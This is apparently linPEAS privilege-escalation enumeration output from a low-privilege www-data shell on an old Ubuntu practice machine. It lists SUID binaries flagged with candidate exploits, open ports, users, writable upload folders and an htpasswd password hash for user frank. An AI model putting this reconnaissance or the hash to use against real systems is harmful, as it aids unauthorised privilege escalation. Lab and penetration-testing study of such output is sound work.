-rwxr-xr-x  1 root root  748 Jul 19  2010 apt-xapian-index
-rwxr-xr-x  1 root root  895 Aug 17  2010 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin




╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                              
                                                                                                                                                                       
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                                 
You can't write on systemd PATH                                                                                                                                        

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                   
                                                                                                                                                                       
╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                   
                                                                                                                                                                       
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                  
                                                                                                                                                                       
╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                  
/com/ubuntu/upstart                                                                                                                                                    
/dev/log
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                    
                                                                                                                                                                       
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                    
busctl Not Found                                                                                                                                                       
                                                                                                                                                                       

                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                                
                                        ╚═════════════════════╝                                                                                                        
╔══════════╣ Hostname, hosts and DNS
ubuntu                                                                                                                                                                 
127.0.0.1       localhost
127.0.1.1       ubuntu.localdomain      ubuntu

::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 192.168.100.1
localdomain

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                    
link-local 169.254.0.0
eth1      Link encap:Ethernet  HWaddr 08:00:27:45:73:d2  
          inet addr:192.168.100.51  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe45:73d2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2333937 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3230681 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:347743976 (347.7 MB)  TX bytes:1035100553 (1.0 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:2473 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2473 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:243132 (243.1 KB)  TX bytes:243132 (243.1 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                                                                                      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::8011                 :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                     
                                                                                                                                                                       


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                  

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                           
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                       
                                                                                                                                                                       
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
                                                                                                                                                                       
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                      
ptrace protection is enabled (1)                                                                                                                                       
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                  
                                                                                                                                                                       
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                        

╔══════════╣ Users with console
backup:x:34:34:backup:/var/backups:/bin/sh                                                                                                                             
bin:x:2:2:bin:/bin:/bin/sh
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
games:x:5:60:games:/usr/games:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                 
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=1000(frank) gid=1000(frank) groups=1000(frank),4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=103(ftp) gid=111(ftp) groups=111(ftp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 14:15:48 up  1:47,  0 users,  load average: 0.15, 0.03, 0.65                                                                                                          
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
firefart pts/0        192.168.209.131  Sat Apr 14 07:32 - down   (00:00)                                                                                               
frank    tty1                          Sat Apr 14 07:31 - down   (00:01)    
frank    tty1                          Sat Apr 14 07:31 - 07:31  (00:00)    
reboot   system boot  2.6.35-19-generi Sat Apr 14 07:30 - 07:33  (00:02)    
frank    pts/0        192.168.209.1    Fri Apr 13 16:14 - down   (15:15)    
frank    tty1                          Fri Apr 13 16:07 - down   (15:22)    
frank    tty1                          Fri Apr 13 16:07 - 16:07  (00:00)    
reboot   system boot  2.6.35-19-generi Fri Apr 13 16:07 - 07:30  (15:23)    

wtmp begins Fri Apr 13 16:07:05 2018

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                      
root             pts/1    192.168.209.131  Sat Apr 14 07:33:47 -0700 2018
frank            pts/0    192.168.209.1    Tue Jul 31 07:43:27 -0700 2018

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                       
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                       


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                                 
                                       ╚══════════════════════╝                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                        
/usr/bin/gcc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                             4:4.6.3-1ubuntu5                  GNU C compiler                                                                                   
ii  gcc-4.6                         4.6.3-1ubuntu5                    GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                       
╔══════════╣ Analyzing Apache Files (limit 70)
Version: Server version: Apache/2.2.22 (Ubuntu)                                                                                                                        
Server built:   Jul 15 2016 15:32:34
httpd Not Found
                                                                                                                                                                       
══╣ PHP exec extensions
/etc/apache2/mods-enabled/php5.conf-    <FilesMatch "\.ph(p3?|tml)$">                                                                                                  
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php5.conf-    <FilesMatch "\.phps$">
/etc/apache2/mods-enabled/php5.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php5.conf-    <FilesMatch "\.ph(p3?|tml)$">
/etc/apache2/mods-available/php5.conf:  SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php5.conf-    <FilesMatch "\.phps$">
/etc/apache2/mods-available/php5.conf:  SetHandler application/x-httpd-php-source
drwxr-xr-x 2 root root 4096 Apr 13  2018 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Apr 13  2018 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 26 Apr 13  2018 /etc/apache2/sites-enabled/000-default -> ../sites-available/default



-rw-r--r-- 1 root root 68428 Feb 13  2017 /etc/php5/apache2/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 68105 Feb 13  2017 /etc/php5/cli/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On

╔══════════╣ Analyzing Http conf Files (limit 70)
-rw-r--r-- 1 root root 0 Apr 13  2018 /etc/apache2/httpd.conf                                                                                                          

╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 Apr 14  2018 /etc/.htpasswd                                                                                                                  
frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 937 Jun 14  2010 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                   
drwxr-xr-x 2 root root 4096 Apr 13  2018 /etc/ldap


╔══════════╣ Searching ssl/ssh files
Port 22                                                                                                                                                                
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/vmware-tools/GuestProxyData/server/cert.pem                                                                                                                       
1214PSTORAGE_CERTSBIN

./linpeas.sh: 3394: gpg-connect-agent: not found
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                                                     
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/libexec/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                       


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 13  2018 /etc/pam.d                                                                                                                    
-rw-r--r-- 1 root root 1287 Mar 26  2013 /etc/pam.d/sshd




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 13  2018 /usr/share/keyrings                                                                                                           
drwxr-xr-x 2 frank frank 4096 Apr 13  2018 /var/lib/apt/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/.htpasswd                                                                                                                                            
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                           
gpg Not Found
netpgpkeys Not Found                                                                                                                                                   
netpgp Not Found                                                                                                                                                       
                                                                                                                                                                       
-rw------- 1 root root 0 Apr 13  2018 /etc/apt/secring.gpg
-rw------- 1 root root 1200 Apr 13  2018 /etc/apt/trustdb.gpg
-rw------- 1 root root 6713 Apr 13  2018 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 6713 May 27  2010 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 27  2010 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 frank frank 6713 Apr 13  2018 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 frank frank 198 Sep  1  2017 /var/lib/apt/lists/archive.ubuntu.com_ubuntu_dists_precise-proposed_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iEYEABECAAYFAlmpLdMACgkQQJdur0N9BbWXkACgpcXQbxmN8vOgswMWa6xKfrSy
f9wAnR1jzqq6lFV/cI+gvhdSyK4yjVuE
=PkRQ
-----END PGP SIGNATURE-----
-rw-r--r-- 1 frank frank 198 May 16  2017 /var/lib/apt/lists/archive.ubuntu.com_ubuntu_dists_precise-security_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iEYEABECAAYFAlkbdFoACgkQQJdur0N9BbU9rwCfYNVz3fCyj8CAgta+2n4DwYkH
OA4An0DYtpLqzntVVoC05SVi32bh2Kgh
=xFOI
-----END PGP SIGNATURE-----
-rw-r--r-- 1 frank frank 198 May 16  2017 /var/lib/apt/lists/archive.ubuntu.com_ubuntu_dists_precise-updates_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iEYEABECAAYFAlkbfzUACgkQQJdur0N9BbVtOwCfai1PcydOkX3ZlvF+Enf1n/la
T8UAn0tMUr2pv9vRskTF8BUUiGlrmwlh
=a1qS
-----END PGP SIGNATURE-----
-rw-r--r-- 1 frank frank 198 Apr 25  2012 /var/lib/apt/lists/archive.ubuntu.com_ubuntu_dists_precise_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iEYEABECAAYFAk+Yf4YACgkQQJdur0N9BbVHsgCfR7AVn0dpd488Ge5cYlOCv5GA
g8wAmwaLRc0PwlYfNr3MbsgQ5T+RBbbd
=J4xr
-----END PGP SIGNATURE-----


╔══════════╣ Kubernetes information
                                                                                                                                                                       
╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 5122 Aug  6  2010 /etc/bash_completion.d/postfix                                                                                                


╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3353 Aug 10  2010 /etc/skel/.bashrc                                                                                                             
-rw-r--r-- 1 frank frank 3353 Apr 13  2018 /home/frank/.bashrc





-rw-r--r-- 1 root root 675 Aug 10  2010 /etc/skel/.profile
-rw-r--r-- 1 frank frank 675 Apr 13  2018 /home/frank/.profile



-rw-r--r-- 1 frank frank 0 Apr 13  2018 /home/frank/.sudo_as_admin_successful



                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                                
                                         ╚═══════════════════╝                                                                                                         
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
-rwsr-xr-x 1 root root 81K Mar 22  2010 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                
-rwsr-xr-x 1 root root 35K Jul 28  2010 /bin/ping
-rwsr-xr-x 1 root root 56K Mar 22  2010 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 36K Jan 26  2010 /bin/su
-rwsr-xr-x 1 root root 31K Jan 26  2010 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jul 28  2010 /bin/ping6
-rwsr-xr-x 1 root root 61K Mar  6  2010 /usr/bin/mtr
-rwsr-xr-x 1 root root 63K Jan 26  2010 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 42K Jan 26  2010 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 32K Jan 26  2010 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 1 daemon 51K Jun 27  2010 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 41K Jan 26  2010 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 2 root root 145K Jul  6  2010 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
-rwsr-xr-x 1 root root 37K Jan 26  2010 /usr/bin/chsh
-rwsr-xr-x 2 root root 145K Jul  6  2010 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 19K Jul 28  2010 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 libuuid libuuid 19K Mar 22  2010 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 315K Jul  9  2010 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 236K Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 11K Nov 10  2009 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9.4K Apr 13  2018 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Apr 13  2018 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                            
-rwxr-sr-x 1 root shadow 31K Aug 16  2010 /sbin/unix_chkpwd                                                                                                            
-rwxr-sr-x 3 root mail 15K Jun 22  2010 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root mlocate 35K Mar 24  2010 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 36K Aug 24  2010 /usr/bin/crontab
-rwxr-sr-x 1 root tty 15K Mar 22  2010 /usr/bin/wall
-rwxr-sr-x 1 root mail 15K May 18  2010 /usr/bin/dotlockfile
-rwxr-sr-x 3 root mail 15K Jun 22  2010 /usr/bin/mail-lock
-rwxr-sr-x 1 root ssh 127K Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Jan 26  2010 /usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Jun 22  2010 /usr/bin/mail-unlock
-rwsr-sr-x 1 1 daemon 51K Jun 27  2010 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 58K Jan 26  2010 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K May 27  2010 /usr/bin/bsd-write
-rwsr-sr-x 1 libuuid libuuid 19K Mar 22  2010 /usr/sbin/uuidd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                                    
/etc/ld.so.conf                                                                                                                                                        
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/vmware-tools-libraries.conf
/usr/lib/vmware-tools/lib32/libvmGuestLib.so
/usr/lib/vmware-tools/lib64/libvmGuestLib.so
/usr/lib/vmware-tools/lib32/libvmGuestLibJava.so
/usr/lib/vmware-tools/lib64/libvmGuestLibJava.so
/usr/lib/vmware-tools/lib32/libDeployPkg.so
/usr/lib/vmware-tools/lib64/libDeployPkg.so
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                             
Current capabilities:                                                                                                                                                  
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff

Shell capabilities:
capsh Not Found
CapInh: 0000000000000000                                                                                                                                               
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: ffffffffffffffff

Files with capabilities (limited to 50):

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                                     
files with acls in searched folders Not Found                                                                                                                          
                                                                                                                                                                       
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                                  
/usr/bin/gettext.sh                                                                                                                                                    

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                                                            
/selinux
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                                           
total 12                                                                                                                                                               
drwxr-xr-x  2 root root 4096 Apr 13  2018 .
drwxr-xr-x 78 root root 4096 May 18 12:28 ..
-rw-r--r--  1 root root  454 Aug  6  2010 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                             
                                                                                                                                                                       
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                           
═╣ Credentials in fstab/mtab? ........... No                                                                                                                           
═╣ Can I read shadow files? ............. No                                                                                                                           
═╣ Can I read shadow plists? ............ No                                                                                                                           
═╣ Can I write shadow plists? ........... No                                                                                                                           
═╣ Can I read opasswd file? ............. No                                                                                                                           
═╣ Can I write in network-scripts? ...... No                                                                                                                           
═╣ Can I read root folder? .............. No                                                                                                                           
                                                                                                                                                                       
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                 
/root/
/bin
/bin/lesskey
/bin/bzcat
/bin/busybox
/bin/bunzip2
/bin/uname
/bin/kbd_mode
/bin/rmdir
/bin/sed
/bin/bzcmp
/bin/bzip2
/bin/uncompress
/bin/zgrep
/bin/netstat
/bin/ls
/bin/nc
/bin/mount
/bin/static-sh
/bin/netcat
/bin/zdiff
/bin/date
/bin/gunzip
/bin/ulockmgr_server
/bin/ping
/bin/loadkeys
/bin/mknod
/bin/bzexe
/bin/grep

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/var/anotherwww                                                                                                                                                        

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                       
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                      
/var/log/syslog
/var/log/kern.log
/var/log/messages

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                                   
logrotate Not Found                                                                                                                                                    
                                                                                                                                                                       
╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                                       
╔══════════╣ Files inside others home (limit 20)
/home/frank/.bash_history                                                                                                                                              
/home/frank/.cache/motd.legal-displayed
/home/frank/.bashrc
/home/frank/.sudo_as_admin_successful
/home/frank/PE.txt
/home/frank/.profile
/home/frank/.bash_logout
/home/frank/user.txt
/bin/lesskey
/bin/bzcat
/bin/busybox
/bin/bunzip2
/bin/uname
/bin/kbd_mode
/bin/rmdir
/bin/sed
/bin/bzip2
/bin/uncompress
/bin/zgrep
/bin/netstat

╔══════════╣ Searching installed mail applications
                                                                                                                                                                       
╔══════════╣ Mails (limit 50)
                                                                                                                                                                       
╔══════════╣ Backup folders
                                                                                                                                                                       
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 673 Apr 13  2018 /etc/xml/xml-core.xml.old                                                                                                      
-rw-r--r-- 1 root root 610 Apr 13  2018 /etc/xml/catalog.old
-rw-r--r-- 1 root root 335 Oct 26  2004 /etc/sgml/catalog.old
-rw-r--r-- 1 root root 3133 Apr 13  2018 /etc/apt/sources.list.bak
-rw-r--r-- 1 root root 9637 Apr 13  2018 /usr/share/info/dir.old
-rw-r--r-- 1 root root 7867 Mar  6  2010 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 101556 Aug 29  2010 /usr/share/doc/linux-image-2.6.35-19-generic/changelog.Debian.old.gz
-rw-r--r-- 1 root root 303 Jun 14  2010 /usr/share/doc/hdparm/changelog.old.gz
-rwxr-xr-x 1 root root 34632 Apr 13  2018 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 29888 Apr 13  2018 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 9328 Aug 29  2010 /lib/modules/2.6.35-19-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 frank frank 334 Apr 14  2018 /var/www/index.html.bak
-rw-r--r-- 1 frank frank 83236 Apr 13  2018 /var/lib/aptitude/pkgstates.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found: /etc/apparmor/severity.db: ASCII Pascal program text                                                                                                            
Found: /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                             
total 72K
drwxr-xr-x  8 frank frank 4.0K Apr 14  2018 .
drwxr-xr-x 16 frank frank 4.0K Apr 14  2018 ..
-rw-r--r--  1 frank frank 1.1K Apr 13  2018 LICENSE
-rw-r--r--  1 frank frank 4.4K Apr 13  2018 README.md
drwxr-xr-x  2 frank frank 4.0K Apr 13  2018 css
drwxr-xr-x  3 root  root  4.0K Apr 14  2018 development
-rw-r--r--  1 frank frank 3.5K Apr 13  2018 gulpfile.js
drwxr-xr-x  2 frank frank 4.0K Apr 13  2018 img

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 May 18 12:28 /dev/.initramfs-tools                                                                                                            
-rw-r--r-- 1 frank frank 220 Apr 13  2018 /home/frank/.bash_logout
-rw-r--r-- 1 root root 97 Apr 13  2018 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Apr 13  2018 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 10  2010 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 74 Apr 13  2018 /usr/lib/pymodules/python2.6/.path
-rw-r--r-- 1 frank frank 149 Apr 14  2018 /var/www/development/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxrwx 1 www-data www-data 763542 Feb 23 06:43 /tmp/linpeas.sh                                                                                                     
-rw-r--r-- 1 frank frank 83236 Apr 13  2018 /var/backups/aptitude.pkgstates.0
-rw-r--r-- 1 root root 350909 Apr 13  2018 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 4191 Apr 13  2018 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                           
/dev/.udev/rules.d/root.rules                                                                                                                                          
/dev/shm
/tmp
/tmp/linpeas.sh
/var/a
/var/anotherwww
/var/lib/php5
/var/lock
/var/lock/apache2
/var/tmp
/var/www/development/uploader/FRANKuploads

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                           
  Group www-data:                                                                                                                                                      
/tmp/linpeas.sh                                                                                                                                                        

╔══════════╣ Searching passwords in history files
                                                                                                                                                                       
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                             
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/pppd/2.4.5/passwordfd.so
/usr/share/man/man7/credentials.7.gz
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
